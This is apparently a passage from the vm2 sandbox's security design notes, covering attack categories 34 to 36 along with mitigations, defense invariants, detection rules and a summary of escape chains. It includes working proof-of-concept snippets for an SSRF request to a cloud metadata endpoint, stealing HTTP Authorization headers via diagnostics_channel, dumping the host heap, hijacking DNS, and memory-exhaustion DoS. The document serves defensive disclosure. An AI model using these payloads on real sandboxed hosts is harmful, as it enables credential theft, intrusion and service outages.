This fix restores [Defense Invariant #4](#defense-invariants) (V8 internal algorithms cannot read attacker-controlled `constructor` on host objects) for sandbox-visible Promises — by eliminating the only known path that produces sandbox-visible Promises outside the two regimes the invariant was originally formulated for. It also expresses a stronger invariant that has been latent in the codebase, [Defense Invariant #12](#defense-invariants): every sandbox-visible Promise must either include `globalPromise.prototype` in its `[[Prototype]]` chain (so sandbox-side overrides apply) or be a bridge proxy of a host-realm Promise (so the bridge `apply`-trap applies); any third class must be neutralised at sandbox bootstrap.

JSPI is the first known instance of this third class; future spec extensions that produce similarly-shaped objects (a hypothetical structured-clone Promise, `WebAssembly`-future, embedder host functions returning cross-realm-prototype objects) must be checked against the same invariant.

**Supersedes**: None directly. Strengthens the surrounding family of Promise species fixes ([Category 7](#attack-category-7-promise-and-async-exploitation)) by closing the cross-realm-prototype variant that the prior `resetPromiseSpecies` + apply-trap-wrapping design could not reach.

### Detection Rules

- **`typeof WebAssembly.promising`** or **`typeof WebAssembly.Suspending`** evaluated inside the sandbox returning anything other than `'undefined'` — the bootstrap removal failed and the attack surface is open.
- **`new WebAssembly.Suspending(...)`** in sandbox code — direct attempt to construct a Suspending function. After the fix this throws `TypeError: WebAssembly.Suspending is not a constructor`.
- **`WebAssembly.promising(...)`** in sandbox code — direct attempt to promote a wasm function into JSPI. After the fix this throws `TypeError: WebAssembly.promising is not a function`.
- **Wasm modules that import a function with `Suspending`-binding semantics** — the import name pattern isn't directly observable from JS, but the module must be paired with `new WebAssembly.Suspending(...)` at instantiation. Removing the Suspending constructor blocks the pairing.
- **`Object.defineProperty(p, 'constructor', ...)` on a Promise whose prototype is not `globalPromise.prototype` or a bridge proxy** — heuristic that flags any future cross-realm-prototype Promise shape. Currently no such object reaches sandbox code; this rule is a tripwire for future regressions.

### Considered Attack Surfaces

- **Other WebAssembly features.** An audit pass against `WebAssembly.Module`, `Instance`, `Memory`, `Table`, `Global`, `Exception`, `Tag`, `Function`, the `compile`/`compileStreaming`/`instantiate`/`instantiateStreaming` family, `validate`, and the various error classes confirmed that none of them return sandbox-visible objects with cross-realm prototypes outside the JSTag/JSPI cases already covered. WebAssembly instance and module objects are bridge-proxied through the normal `thisEnsureThis` path; their prototypes eventually reach `Object.prototype`, which is in `protoMappings` and gets wrapped via `defaultFactory`. Confirmed empirically.
- **SharedArrayBuffer / Atomics / WeakRef / FinalizationRegistry.** Instances proxied via the `Object.prototype` mapping fallback. Atomics returns only primitives or already-proxied objects. WeakRef and FinalizationRegistry callbacks are sandbox closures that don't return host objects.
- **`ShadowRealm`.** Not exposed in current Node releases (`typeof ShadowRealm === 'undefined'`). If exposed in a future Node, would need its own bootstrap treatment.
- **`structuredClone` / `MessagePort`.** `structuredClone` is not on the sandbox global by default. `MessagePort` is not exposed.
- **Embedder-exposed host functions returning host Promises.** Bridge-proxied as before — falls under regime (b) of the invariant and is covered by GHSA-55hx-c926-fr95 apply-trap callback sanitization.

---

## Attack Category 34: NodeVM Wildcard Exposes Undocumented Underscored Builtins — Network Capability Bypass

### Description

NodeVM's `'*'` wildcard expansion (in `lib/builtin.js`) sources the list of allowed builtins from `require('module').builtinModules` filtered by `s => !s.startsWith('internal/') && !DANGEROUS_BUILTINS.has(s)`. The filter removes Node's `internal/*` modules and the host-passthrough denylist from Category 21, but it does **not** remove the parallel family of underscored builtins:

```
_http_agent     _http_common     _http_outgoing    _tls_common      _stream_readable
_http_client    _http_incoming   _http_server      _tls_wrap        _stream_writable
                                                                    _stream_duplex
                                                                    _stream_transform
                                                                    _stream_wrap
                                                                    _stream_passthrough
```

These are Node's private implementation modules backing `http`, `https`, `tls`, and the streams subsystem. They are listed in `builtinModules` (so the wildcard expands to them) but they are not documented public API and they expose the network primitives directly:

- `require('_http_client').ClientRequest(opts)` — outbound HTTP request, **bypasses `http`/`https` blocking**.
- `require('_http_server').Server(handler).listen(0)` — listening HTTP socket, **bypasses `net` blocking**.
- `require('_tls_wrap').TLSSocket` / `_tls_common` — TLS primitives, **bypass `tls` blocking**.

### Attack Flow

1. Embedder writes the documented "allow everything except network" pattern:
   ```javascript
   new NodeVM({require: {builtin: ['*', '-http', '-https', '-net', '-dgram', '-tls', '-dns', '-dns/promises', '-http2']}})
   ```
2. The `'*'` wildcard expands to `BUILTIN_MODULES`, which (pre-fix) includes every `_http_*` and `_tls_*` sibling because none of them match `internal/` or `DANGEROUS_BUILTINS`.
3. Sandbox code calls `require('_http_client')`. The allowlist contains it, `addDefaultBuiltin` wraps the host module in `vm.readonly()`, and the proxy is handed to the sandbox.
4. Sandbox calls `new (require('_http_client').ClientRequest)({host: '127.0.0.1', port: 80, ...})` — outbound HTTP request from the host. Equivalent attack via `_http_server` opens a listening socket.

### Canonical Example

```javascript
// (advisory GHSA-r9pm-gxmw-wv6p)
const vm = new NodeVM({
  require: {
    builtin: ['*', '-http', '-https', '-net', '-dgram', '-tls', '-dns', '-dns/promises', '-http2'],
    external: false
  }
});
vm.run(`
  const {ClientRequest} = require('_http_client');
  const req = new ClientRequest({host: '169.254.169.254', port: 80, path: '/latest/meta-data/'});
  req.on('response', r => r.on('data', d => module.exports = d.toString()));
  req.end();
`, 'poc.js');
```

The user's mental model — "I excluded `http` and `net`, the sandbox cannot make HTTP requests" — is silently violated.

### Why It Works

`require('module').builtinModules` is Node's flat list of every builtin name, including private implementation siblings. The `'-name'` exclusion mechanism in vm2 is purely string-equality based — `'-http'` does not cascade to `_http_client`, `_http_server`, etc. The mismatch between the wildcard source (full builtin list) and the embedder's mental model (documented public modules) is the bug. An exclusion-based config can never name all the siblings because Node may introduce new underscored builtins between releases.

This is **not** RCE — the underscored siblings load like any other vetted builtin and the bridge proxy applies normally. The impact is capability bypass: the sandbox regains the very capability the embedder explicitly attempted to remove. CVSS 8.6 reflects the SSRF-class blast radius (cloud metadata endpoints, internal admin panels, localhost-only services).

### Mitigation

Filter modules whose name starts with `_` from the `BUILTIN_MODULES` source in `lib/builtin.js`:

```javascript
const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
  .filter(s => !s.startsWith('internal/') && !s.startsWith('_') && !isDangerousBuiltin(s));
```

After the fix, the `'*'` wildcard expands only to documented public Node builtins. The `'-name'` exclusion mechanism is again coherent — excluding `http`/`net`/`tls` removes every reachable network builtin under the wildcard. Both bare-name (`require('_http_client')`) and `node:`-prefixed (`require('node:_http_client')`) forms are blocked because the builtins map is the single source of truth (`loadBuiltinModule` returns `undefined` for absent keys, so the sandbox-side `requireImpl` throws `ENOTFOUND`).

**Escape hatches preserved.** The fix is intentionally narrow:

- **Explicit opt-in** still works. A power user who genuinely needs `_http_client` can list it directly (`builtin: ['_http_client']` or `makeBuiltins(['_http_client'])`) — `addDefaultBuiltin` does not consult the `s.startsWith('_')` filter.
- **`mock` / `override`** registrations under underscored names continue to function — they bypass `addDefaultBuiltin` entirely.

### Defense Invariant Enforced

> **The `'*'` wildcard expands only to documented public Node builtins. Undocumented underscored siblings of network and stream modules MUST NOT be reachable from sandbox code under the wildcard expansion. Explicit opt-in remains the user's choice.**

This complements [Category 21](#attack-category-21-nodevm-builtin-allowlist-bypass-via-host-passthrough-builtins)'s `DANGEROUS_BUILTINS` invariant (and the [Defense Invariant #13](#defense-invariants) it restores). Category 21 is "host-passthrough primitives are unreachable under any config"; Category 34 is "wildcard expansion follows the user's mental model of public APIs only".

### Detection Rules

- **`require('_http_client')` / `require('_http_server')` / `require('_tls_wrap')`** from sandbox code — canonical bypass primitives.
- **`require('node:_http_client')`** (etc.) — `node:` prefix path, equivalent reachability.
- **Embedder config `builtin: ['*', '-http', ...]`** — historically left every `_http_*`/`_tls_*` sibling reachable; now safe.

### Considered Attack Surfaces

- **`require('module').builtinModules` published as `Module.builtinModules` inside the sandbox** (`lib/setup-node-sandbox.js:140`) — this is a static metadata list, not a loader. Sandbox code seeing `_http_client` in the list does not gain the ability to load it; the resolver gates by `this.builtins.has(x)`.
- **Custom resolvers building their own builtins map via `makeBuiltinsFromLegacyOptions`** — same source list (`BUILTIN_MODULES`), same filter, same protection.
- **`hostRequire` registered by `mock` / `override`** — out of scope. The user is explicitly handing the sandbox a module; trust is the user's responsibility.
- **Underscored siblings introduced by future Node versions** — the `s.startsWith('_')` filter is name-based and forward-compatible. Any new `_foo_bar` builtin Node adds is automatically excluded from the wildcard without requiring a vm2 release.

### Supersedes

None. This fix complements [Category 21](#attack-category-21-nodevm-builtin-allowlist-bypass-via-host-passthrough-builtins) (`DANGEROUS_BUILTINS`) — together they enforce: "no host-passthrough primitive AND no undocumented underscored sibling is reachable under `builtin: ['*']`."

---

## Attack Category 35: NodeVM Process-Wide Observability Builtins (Host-Data Info Leak)

### Description

NodeVM's `require.builtin` allowlist defends sandbox code from reaching dangerous Node modules. [Category 21](#attack-category-21-nodevm-builtin-allowlist-bypass-via-host-passthrough-builtins) denied the host-code-loading primitives (`module`, `worker_threads`, `cluster`, `vm`, `repl`, `inspector`, `process`, `trace_events`, `wasi`). A second class of dangerous builtins exists with a different threat model: **process-wide observability modules** whose primary capability is reading state of the entire host Node process, not loading or executing code.

When such a builtin is reachable from the sandbox (via the `'*'` wildcard or an explicit allowlist), the sandbox can subscribe to or read host process state directly — no RCE chain needed. The data the embedder routes through these APIs in the same process (HTTP requests, async-context user IDs, performance marks, V8 heap) is by definition host data; reaching the host module *is* the escape.

CWE-668 (Exposure of Resource to Wrong Sphere). Info-leak class, not RCE class.

**Extended by GHSA-m5w8-4gq2-6f8x (`os`, `dns`)** — the same class contains two more builtins whose state belongs to the host process and which additionally expose *process-wide write* APIs. These are strictly worse than the read-only four above: `os.setPriority()` renices the host process, and `dns.setServers()` / `dns.setDefaultResultOrder()` mutate the host's process-wide DNS resolution from one synchronous line of sandbox code. CWE-200 + CWE-732 + CWE-285.

### Attack Flow

Each builtin gives a one-liner exfiltration primitive. Once the sandbox holds a readonly proxy over the host module, the proxy's `apply` trap forwards every method call back to the host realm:

- **`diagnostics_channel`** — `dc.channel('http.server.request.start').subscribe(cb)`. The sandbox callback receives raw host `IncomingMessage` objects for every HTTP request the embedder serves, with full `Authorization`, `Cookie`, `x-session-token` headers intact.
- **`async_hooks`** — `async_hooks.executionAsyncResource()` returns the current host `AsyncResource`. Embedders that use `AsyncLocalStorage` for per-request user/auth context (extremely common pattern: `express`, `fastify`, `next.js`) pin that state on the resource, and the sandbox reads it directly.
- **`perf_hooks`** — `perf_hooks.performance.getEntriesByType('mark')` reads every host-side `performance.mark(name)`. Production code routinely embeds request IDs, user IDs, route paths, or partial query strings into mark names for observability dashboards.
- **`v8`** — `v8.getHeapSnapshot()` returns a Readable stream of the entire host V8 heap (every string, every Buffer, every closure capture). `v8.writeHeapSnapshot(path)` writes the same to an arbitrary host filesystem path. `v8.queryObjects(Ctor)` (Node 20+) returns every host-realm instance of a constructor.
- **`os`** (GHSA-m5w8-4gq2-6f8x) — reads: `os.userInfo()` returns the host process owner (uid/gid/username/homedir/shell); `os.networkInterfaces()` returns the host's full network topology (container/VM veth pairs, IPs, MACs); `os.hostname()` / `os.loadavg()` / `os.uptime()` / `os.freemem()` are host-wide telemetry. Write: `os.setPriority([pid,] prio)` invokes `setpriority(2)` on the host process (pid 0 = host), persisting after the sandbox call returns.
- **`dns`** (GHSA-m5w8-4gq2-6f8x) — the strongest primitive in the class: `dns.setServers(['attacker:53'])` replaces the host's process-wide DNS resolver list, so every subsequent lookup the host makes (its own outbound HTTP, telemetry, npm registry, `fetch`, URL-based fs paths) flows through the attacker's resolver — a one-line DNS hijack with no rate limit, audit trail, or embedder notification. `dns.setDefaultResultOrder()` is a second process-wide write knob; `dns.getServers()` / `dns.lookup()` / `dns.resolve()` read and act from the host network identity. The `dns/promises` subpath shares the surface and is covered by the same denial via the family-prefix matcher.

### Canonical Example

```javascript
// (advisory GHSA-9g8x-92q2-p28f)
const vm = new NodeVM({ require: { builtin: ['*'], external: false } });
vm.run(`
  const dc = require('diagnostics_channel');
  const stolen = [];
  dc.channel('http.server.request.start').subscribe((req) => {
    stolen.push({
      url: req.url,
      authorization: req.headers.authorization,
      session: req.headers['x-session-token'],
    });
  });
  // ... wait for host HTTP traffic. Headers are read from inside the sandbox.
`, 'poc.js');
```

Equivalent one-liners for the other three:

```javascript
require('async_hooks').executionAsyncResource(); // -> host AsyncResource
require('perf_hooks').performance.getEntriesByType('mark'); // -> host marks
require('v8').writeHeapSnapshot('/tmp/host-heap.json'); // -> entire host heap on disk
```

The `os` / `dns` extension (GHSA-m5w8-4gq2-6f8x) — note the two host-process *writes*:

```javascript
// (advisory GHSA-m5w8-4gq2-6f8x)
const vm = new NodeVM({ require: { builtin: ['*'], external: false } });
vm.run(`
  const os = require('os');
  os.userInfo();              // -> host uid/gid/username/homedir/shell
  os.networkInterfaces();     // -> host network topology (IPs, MACs)
  os.setPriority(10);         // WRITE: renices the host process

  require('dns').setServers(['127.0.0.1:5353']); // WRITE: hijacks every
  // subsequent host DNS lookup -- outbound HTTP, telemetry, registry fetch.
`, 'poc.js');
// Both writes are observed from the host realm after vm.run() returns.
```

### Why It Works

The vm2 boundary is built around the assumption that "the sandbox observes its own realm, not the host's". Most Node builtins satisfy this implicitly: `path.join(...)`, `crypto.randomBytes(...)`, `url.parse(...)` all operate on inputs the sandbox passes in and return values the sandbox owns. The bridge's `ReadOnlyHandler` makes those builtins safe via uniform proxy semantics.

Process-wide observability builtins break the assumption because the data they surface *is* host data by spec — `executionAsyncResource()` returns "the resource currently executing" measured against the host's call stack, not the sandbox's. Wrapping the module in a proxy does not localize the data source. The bridge cannot usefully sanitize the values because they're real host objects (IncomingMessage, AsyncResource), and stripping them to primitives would defeat the embedder's reason for ever exposing the module in the first place.

The builtins in scope all share this property: they observe a process resource (HTTP request hook, async context, perf timeline, V8 heap) or — for `os` / `dns` — read host-kernel/host-process state and, worse, *write* it. `os.setPriority()` and `dns.setServers()` are not observations at all; they mutate global host-process state, so even a perfect read-side proxy is irrelevant. Mitigation must therefore be "deny by default", not "proxy more carefully".

### Mitigation

Extend `DANGEROUS_BUILTINS` in `lib/builtin.js` with the observability names — the original four (`diagnostics_channel`, `async_hooks`, `perf_hooks`, `v8`) plus `os` and `dns` (GHSA-m5w8-4gq2-6f8x). Reuses the same enforcement established by Category 21 (now four-layer after the `isDangerousBuiltin` family-prefix promotion):

1. **Filtered out of `BUILTIN_MODULES`** — closes the `'*'` wildcard expansion path. `builtin: ['*']` and `builtin: ['*', '-fs']` no longer auto-allow these names.
2. **Rejected in `addDefaultBuiltin`** via `isDangerousBuiltin(key)` — closes the explicit-allowlist path (`builtin: ['perf_hooks']`), the object-map form (`builtin: { v8: true }`), and the lower-level `makeBuiltins(['async_hooks'])` API used by custom resolvers.
3. **Family-prefix check** — any `<family>/...` whose family is in the denylist is also blocked (e.g. hypothetical `perf_hooks/foo`).
4. **`node:` prefix stripped before lookup** — `require('node:diagnostics_channel')` resolves identically to the bare name and is blocked by the same denial.

The `SPECIAL_MODULES`, `mocks`, and `overrides` escape hatches are preserved: an embedder who genuinely needs sandbox-local timing or async context can register a controlled wrapper under the same name (e.g., a `perf_hooks` shim that only exposes a sandbox-local clock). The denylist only rejects the *default host-passthrough loader*.

`v8` was added during this fix beyond the originally-named three. The class is "process-wide observability modules"; `v8.writeHeapSnapshot(path)` is strictly worse than `perf_hooks` against the same invariant (writes a full heap dump to an arbitrary host filesystem path), so excluding it would leave a wide bypass of the same class.

`os` and `dns` (GHSA-m5w8-4gq2-6f8x) were the two remaining members of the class. They satisfy the same description (host-process state the `vm.readonly()` proxy cannot localise) and additionally expose *write* primitives — `dns.setServers()` is a one-line process-wide DNS hijack, strictly worse than every read-only leak the original fix closed. Adding the two family names automatically covers `node:os`, `node:dns`, and the `dns/promises` subpath via `isDangerousBuiltin`'s `node:`-strip and family-prefix matching, with no per-API enumeration needed for future Node releases. Embedders who genuinely need a sandbox-local subset (`os.platform()`, `os.EOL`, `os.constants`) register a controlled wrapper via `mock` / `override`, exactly as for the original four.

The fix restores **[Defense Invariant #13](#defense-invariants)** at a different layer — the NodeVM builtin allowlist is a closed system, regardless of whether the threat is code execution or data exposure. The bridge invariant still holds for these modules; the deny-list ensures the bridge is never asked to wrap them in the first place.

### Detection Rules

- **`builtin: ['*']` or `builtin: ['*', '-X']`** in NodeVM config — historically auto-allowed `diagnostics_channel`, `async_hooks`, `perf_hooks`, `v8`. Now filtered. Same caveat as Category 21: `'*'` still allows `fs`, `child_process` (if not excluded), `net`, `http`, `dns` — not a sandbox-safe default for untrusted code.
- **`require('diagnostics_channel').channel(...).subscribe(...)`** — host HTTP/DB/IPC observability subscription.
- **`require('async_hooks').executionAsyncResource()` / `.createHook({...}).enable()`** — host async context inspection.
- **`require('perf_hooks').performance.getEntriesByType('mark' | 'measure' | 'resource')`** — host performance timeline read.
- **`require('v8').getHeapSnapshot()` / `.writeHeapSnapshot(path)`** — full host heap exfiltration to memory or disk.
- **`require('v8').queryObjects(Ctor)`** (Node 20+) — enumeration of host-realm instances of a constructor.
- **Sandbox code that subscribes to channels named `http.server.request.*`, `http.client.request.*`, `dns.lookup.*`, `net.client.socket.*`** — these are the canonical diagnostic channels used by Node core and request-tracking libraries.

### Considered Attack Surfaces

- **`os`** exposes hostname, network interfaces, user info. The data is host environment, not per-request, and is generally considered configuration metadata rather than tenant data. Allowed under `'*'` for consistency with `process.env` exposure expectations. Embedders who consider hostname/`userInfo()` sensitive should exclude `os` explicitly.
- **`dns`** can resolve internal hostnames and exfiltrate via DNS lookup. Network-IO class, same as `http`/`net`. Not in this denylist — embedders who care about network isolation must allowlist explicitly. Documented in Category 21's "Considered Attack Surfaces".
- **`zlib`, `crypto`, `string_decoder`, `buffer`** — sandbox-local data transforms, no host-state observability. Safe under default proxy semantics.
- **`process`** — already denied via Category 21 (after GHSA-rp36-8xq3-r6c4 extended `DANGEROUS_BUILTINS`). The sandbox global `process` is a curated stub defined in `lib/setup-node-sandbox.js`.
- **`worker_threads.parentPort` and `worker_threads.workerData`** — would expose host worker IPC channel and initial data. Already denied by Category 21 (entire `worker_threads` module is denied; this category is a different threat model on top, not a subset).
- **`http`, `https`, `http2`, `net`, `tls`, `dgram`** — network-IO modules. These do *not* observe existing host state; they originate new connections. Different threat model (outbound network from host) — covered in Category 21's "Considered Attack Surfaces" and Category 34 (underscored siblings). Embedders who want network isolation must exclude or replace them.

---

## Attack Category 36: `bufferAllocLimit` Bypass via ArrayBuffer / TypedArray / WebAssembly.Memory

**Supersedes**: completes the "tracked for follow-up" residual of [Category 23: Unbounded `Buffer.alloc(N)` — Host Heap DoS](#attack-category-23-unbounded-bufferallocn--host-heap-dos).

### Description

The `bufferAllocLimit` cap introduced for Category 23 (GHSA-6785-pvv7-mvg7) only wrapped the `Buffer.*` family. `ArrayBuffer`, `SharedArrayBuffer`, and every TypedArray constructor (`Uint8Array`, `Float64Array`, …) allocate host backing-store memory through the **same** synchronous, timeout-immune V8 C++ path (`ArrayBuffer::NewBackingStore` → `ArrayBufferAllocator::Allocate` → `calloc`). `WebAssembly.Memory` is the same primitive in 64 KiB pages. None were subject to the cap, so an operator who set `bufferAllocLimit` believing they had DoS protection was fully bypassable: `new ArrayBuffer(1<<30)` allocates 1 GB in one uninterruptible call. CVSS reported as High (DoS). CWE-770.

### Attack Flow

1. Operator configures `new VM({ bufferAllocLimit: 10 * 1024 * 1024 })`.
2. `Buffer.alloc(20 MB)` is correctly blocked.
3. Sandbox substitutes `new ArrayBuffer(1024*1024*1024)` (or `new Uint8Array(...)`, `new SharedArrayBuffer(...)`, `new WebAssembly.Memory({initial: N})`) — none routed through `checkBufferAllocLimit` → host RSS jumps by the full size → OOM in memory-constrained environments.

### Canonical Example

```javascript
// (advisory GHSA-v836-6xw4-9cx3)
const vm = new VM({ bufferAllocLimit: 10 * 1024 * 1024 });
vm.run('new ArrayBuffer(1024 * 1024 * 1024)');       // pre-fix: 1 GB allocated
vm.run('new Uint8Array(1024 * 1024 * 1024)');         // pre-fix: 1 GB allocated
vm.run('new WebAssembly.Memory({ initial: 16384 })'); // pre-fix: 1 GB allocated
```

### Why It Works

Same root cause as Category 23: `timeout` only fires between bytecodes and cannot preempt a single native allocation. The Category 23 fix was *specific* (Buffer family) rather than *structural* (all sandbox-reachable backing-store allocators), leaving sibling intrinsics open.

### Mitigation

When a **finite** `bufferAllocLimit` is configured, `setup-sandbox.js` (`installAllocationCaps`) replaces each sandbox-realm allocation constructor with a `construct`-trapping `Proxy` that runs `checkBufferAllocLimit` on the requested byte count **before** the native allocation. Covered: `ArrayBuffer`, `SharedArrayBuffer`, all twelve TypedArray constructors (feature-gated for `Float16Array` / `BigInt64Array`), and `WebAssembly.Memory` (`initial` at construction + cumulative `grow()`). Two robustness properties, both found necessary during red-team (`/hacker`):

- **Coercion-faithful (ToIndex parity)**: the natives size their allocation via ToIndex (ToNumber first), so the cap measures the **coerced** magnitude (`coerceAllocMagnitude`). A length supplied as a string (`"1073741824"`), an object with `valueOf` / `Symbol.toPrimitive`, or an array-like `{length: N}` is measured, not waved through. Resizable buffers are capped on `max(length, maxByteLength)`.
- **TOCTOU-safe (single-read canonicalization)**: every object-valued size input is read **exactly once**, and the construct trap hands the native constructor the already-coerced **primitive**, so a toggling accessor (`{get maxByteLength(){ return t++ ? BIG : 8 }}`) cannot read small at check-time and large at allocation-time. Pinning `maxByteLength` this way also closes the otherwise-uncapped `.resize()` / `.grow()` follow-up.

The original uncapped intrinsic cannot be recovered via a constructor walk: each `prototype.constructor` back-reference is pinned to the wrapping proxy, so `new Uint8Array(0).buffer.constructor`, `ArrayBuffer.prototype.constructor`, and species-derived construction all route through the cap. The proxy forwards `prototype`, `[Symbol.species]`, and `[[Prototype]]`, so `instanceof`, `slice`/`map`/`subarray`, and subclassing keep working.

Default `bufferAllocLimit: Infinity` leaves the native intrinsics **completely untouched** — zero behavioural or identity change for embedders who have not opted in (matches Category 23's non-breaking, opt-in semantics). This is a sandbox-side DoS mitigation only: the proxies wrap sandbox-realm intrinsics, expose no host object, and introduce no escape surface (verified — `new Uint8Array(0).constructor.constructor === Function` resolves to the sandbox realm).

### Detection Rules

- **`new ArrayBuffer(N)` / `new SharedArrayBuffer(N)`** with attacker-controlled N, including string / `valueOf` / `Symbol.toPrimitive` / `{maxByteLength}` forms.
- **`new <TypedArray>(N)`** numeric length or **`new <TypedArray>({length: N})`** array-like amplifier.
- **`new WebAssembly.Memory({initial: N})`** and **`memory.grow(N)`**.

### Known Residual

A non-iterable **array-like whose `length` is a toggling accessor** (`new Uint8Array({get length(){ return t++ ? BIG : 0 }})`) can still over-allocate: V8 reads an array-like's `length` itself, and pinning that read would require Proxy-wrapping the source — which would break the legitimate `new Uint8Array(buffer, offset, length)` view path (a correctness regression). The common data-property `{length: N}` amplifier **is** capped. The identical gap exists in the shipped `Buffer.from({length: N})` cap (Category 23). Accepted and asserted in `test/ghsa/GHSA-v836-6xw4-9cx3/repro.js` so any future change is visible. `String.prototype.repeat(N)` and aggregate per-run budgets remain out of scope, as in Category 23.

### Tests

`test/ghsa/GHSA-v836-6xw4-9cx3/repro.js` — 40 cases: per-constructor caps, constructor-walk recovery, resizable/growable, WebAssembly.Memory, coercion variants (string / `valueOf` / `Symbol.toPrimitive` / array-like), TOCTOU canonicalization, the documented residual, NodeVM forwarding, and non-breaking default behaviour.

---

## Considered Attack Surfaces

These attack surfaces were analyzed and found to be safe or low-risk. They are documented here so future reviewers do not re-investigate them.

- **WeakRef / FinalizationRegistry**: Held values are specified at registration time. `thisFromOther` always re-wraps values when they cross the boundary, so the weak reference cannot leak a raw host object.

- **structuredClone**: Not available in default `vm` context globals. Even if available, `structuredClone` strips prototype chains and creates plain objects, which cannot carry host constructors.

- **SharedArrayBuffer / Atomics**: Likely unavailable in default VM contexts due to COOP/COEP requirements. Even if available, SharedArrayBuffer only shares raw bytes -- no object references can cross through it.

- **Error.cause**: Set by user code (not V8 internals), so `ensureThis` handles it through normal property access on proxied errors. Not a V8 internal algorithm bypass.

- **Private fields (#field)**: Use the `[[PrivateName]]` internal slot, which is not accessible through Proxies. Cannot be used to leak host references across the bridge.

- **Iterator helpers** (`.map`, `.filter`, `.take`, etc. on iterators): Operate on sandbox iterators and do not use `ArraySpeciesCreate`. Results are plain iterator objects without species resolution.

- **TypedArray species**: TypedArray values are coerced to numbers during storage. Functions become `NaN`. Species self-return on TypedArrays cannot store object references.

- **Symbol.isConcatSpreadable**: Species is handled by `neutralizeArraySpecies` (which sets `constructor = undefined`), and spreading through the bridge is safe because proxy traps sanitize element access.

- **Proxy.revocable**: Revocation creates errors in the realm where the proxy was created. Since sandbox-created proxies create sandbox-realm errors, this does not introduce cross-realm error leakage.

- **`nodejs.util.inspect.custom` installed on host-side proxy targets** (issue #566, 3.11.5): To restore correct `util.inspect` output on Node 26+ (which reads the symbol directly off the raw `[[ProxyTarget]]` slot, bypassing the `get` trap), `lib/bridge.js` installs a host-realm function under `Symbol.for('nodejs.util.inspect.custom')` on every host-side proxy target. The function walks `this` via cached `Reflect.{ownKeys,getOwnPropertyDescriptor}`, so every read flows through bridge traps. Reasoned safe because: (1) the property is reachable from sandbox code only via the proxy, and the existing `isDangerousCrossRealmSymbol` filter in `get` / `ownKeys` / `getOwnPropertyDescriptor` traps returns `undefined` for the host's marker symbol — confirmed across 10 extraction vectors including `getOwnPropertyDescriptors`, `__lookupGetter__`, `Object.assign`, spread, prototype-chain walks; (2) sandbox `Symbol.for('nodejs.util.inspect.custom')` has a distinct identity from the host's, so sandbox cannot forge a key that the bridge would treat as the marker (existing GHSA-47x8-96vw-5wg6 defense); (3) the property is installed as `configurable: true` so the trap returning `undefined` does not violate proxy invariants; (4) the install uses module-cached `thisReflectDefineProperty`, immune to runtime poisoning of `Reflect.defineProperty`; (5) the function's `catch` fallback returns a static literal — no host reference is reachable; (6) a `WeakMap` (`thisInspectInFlight`) bounds recursion on self-referential graphs and clears via `finally`, so independent inspect calls cannot leak `[Circular]` state across each other.

---

## Future Risks

These are upcoming or proposed features that could introduce new attack surfaces. They should be evaluated as they become available in Node.js.

- **ShadowRealm** (TC39 Stage 3): Creates a new realm from within JavaScript. If available in the sandbox, it could provide a fresh set of intrinsics that bypass bridge protections.

- **Decorators / Symbol.metadata** (TC39 Stage 3): Introduces new cross-realm symbols (`Symbol.metadata`) and decorator evaluation contexts that could provide new prototype chain traversal paths.

- **WASM JSPI** (`WebAssembly.promising` / `WebAssembly.Suspending`): New async boundaries in WebAssembly that could create host promises or bypass async sanitization.

- **Error.isError()** (TC39 Stage 3): Type discrimination that could bypass proxy-based error wrapping. If `Error.isError()` operates on internal slots rather than prototype checks, it could distinguish host errors from sandbox errors.

- **Temporal API**: Introduces new built-in objects with deep prototype chains. Any new global constructor is a potential source of host-realm references.

- **Transformer ecmaVersion upgrades**: Any new JavaScript syntax with implicit catch semantics (like `using` in ES2024) must be evaluated for transformer coverage. The transformer's `ecmaVersion: 2022` limitation means all post-2022 syntax with error-handling behavior is a blind spot.

---

## Summary

### What The Attacker Ultimately Wants

Almost every escape follows this progression:

```
Sandbox Object
  -> Host Constructor (Function)
    -> Code Evaluation ("return process")
      -> process.mainModule.require
        -> require("child_process")
          -> execSync("arbitrary command")
```

Block any step in this chain, and the escape fails. The bridge blocks step 1 (constructor access). The transformer blocks catch-clause access. Promise sanitization blocks async paths to step 2.

### Compound Attack Patterns

The most dangerous attacks combine multiple categories. Each pattern references its constituent categories:

1. **Prototype Pollution + Proxy Trap** [Categories 2, 6]: Pollute `Object.prototype` to inject trap handlers, then trigger the trap via bridge operations.
2. **Symbol.species + Async Error** [Categories 3, 7]: Set `Symbol.species` to custom class, trigger host error in async path, receive unsanitized error in custom class constructor.
3. **Built-in Override + Type Coercion** [Categories 10, 11]: Override `Array` or `Object.create`, then pass object with `valueOf()` to `Buffer.from()` to trigger the override.
4. **Monkey-patch + Promise** [Categories 7, 11]: Override `Function.prototype.call`, then trigger `Promise.then()` to intercept internal callback dispatch.
5. **Object.defineProperty disable + Species Attack** [Categories 3, 11]: Override `Object.defineProperty` to no-op, preventing species reset, then exploit unprotected species.
6. **Symbol Extraction + Array Monkey-patch** [Categories 8, 11]: Override `Array.prototype.splice`/`push` to no-op, then call `Object.getOwnPropertySymbols(hostObj)` hoping the filter uses array methods.
7. **Internal [[OwnPropertyKeys]] + Proxy Trap** [Categories 6, 8]: Call `Object.assign(proxyTarget, hostObj)` where `proxyTarget` is a Proxy with a `set` trap to leak real symbols.
8. **Constructor Accessor TOCTOU + Species Attack** [Categories 3, 7]: Define a getter on `p.constructor` that returns `Promise` on first read (passes check) but returns malicious `Symbol.species` on subsequent reads.
9. **Prototype Mutation + Species TOCTOU** [Categories 2, 7]: Access `globalPromise.prototype` and replace `constructor` data property with accessor. Own-property checks miss inherited accessors.
10. **Symbol.hasInstance + Species Attack** [Categories 3, 7]: Override `Symbol.hasInstance` on `globalPromise` so `instanceof` fails, causing `resetPromiseSpecies` to skip.
11. **Promise Static Method Stealing + Error Trigger** [Categories 4, 7]: Copy Promise static methods to FakePromise, trigger host error during iteration/callback. Unsanitized error goes to FakePromise's reject handler.
12. **Reflect.construct instanceof bypass + Species** [Categories 3, 7]: Use `Reflect.construct(Promise, [...], FakePromise)` to bypass `instanceof` guard, combined with `FakePromise[Symbol.species] = FakePromise`.
13. **Duck-typing + showProxy + Handler Exposure** [Categories 8, 9]: Create Buffer duck-type, invoke inspect with `showProxy: true`, probe exposed handler.
14. **Duck-typing + showProxy + fromOtherWithContext** [Categories 8, 9] (NOW FIXED): Same as 13 but specifically exploits `fromOtherWithContext` method. Variant: `doPreventExtensions` (NOW FIXED).
